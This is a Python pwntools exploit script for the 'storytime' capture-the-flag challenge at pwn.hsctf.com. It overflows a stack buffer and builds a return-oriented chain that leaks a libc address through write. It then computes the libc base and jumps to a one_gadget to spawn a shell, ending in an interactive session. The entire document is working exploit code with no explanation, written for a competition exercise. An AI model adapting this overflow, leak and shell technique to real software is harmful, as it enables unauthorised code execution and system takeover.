from pwn import *

p = process('./storytime')

gdb.attach(p)

p = remote('pwn.hsctf.com',3333)



end = p64(0x00000000004005f1)

pop_rdi = p64(0x0000000000400703)

pop_rsi_r15 = p64(0x0000000000400701)

start_main = p64(0x0000000000600ff0)

write_plt = p64(0x00000000004004a0)

ret_main = p64(0x000000000040062e)

ret = p64(0x000000000040048e)



p.recvline()

p.recvline()

exp  = "a"*0x38

exp += ret

exp += end

exp += pop_rdi + p64(1)

exp += pop_rsi_r15 + start_main + start_main

exp += write_plt

exp += ret_main

p.sendline(exp)

p.recvline()

p.recvline()

leak = u64(p.recvline()[1:7]+"\x00\x00")

base = leak-137904

one = base + 0x4f2c5

print hex(leak)



p.recvline()



exp  = "a"*0x38

exp += ret

exp += p64(one)



p.sendline(exp)



p.interactive()